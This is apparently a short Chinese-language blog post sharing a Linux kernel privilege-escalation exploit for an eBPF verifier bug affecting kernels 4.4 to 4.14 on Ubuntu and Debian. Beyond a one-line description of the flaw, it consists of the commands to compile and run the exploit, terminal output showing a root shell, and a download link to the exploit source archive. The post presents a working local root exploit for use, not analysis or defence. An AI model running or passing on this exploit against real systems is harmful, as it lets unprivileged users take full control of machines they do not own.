---
title: "Ubuntu 提权 EXP"
date: 2018-03-30T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['exp','linux']
categories: ['linux']

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


该漏洞存在于 Linux 内核带有的 eBPF bpf(2) 系统调用中, 当用户提供恶意 BPF 程序使 eBPF 验证器模块产生计算错误, 导致任意内存读写问题.

<!--more-->

kernel 4.14 - 4.4

Only Ubuntu / Debian

```
$ gcc -o exp upstream44.c
$ chmod 777 exp
$ ./exp
task_struct = ffff8800789c1540
uidptr = fff88007c0cb6c4
spawning root shell
# whoami
root
```

[upstream44.zip](http://exp10it-1252109039.cossh.myqcloud.com/2018/03/30/1522407731.zip)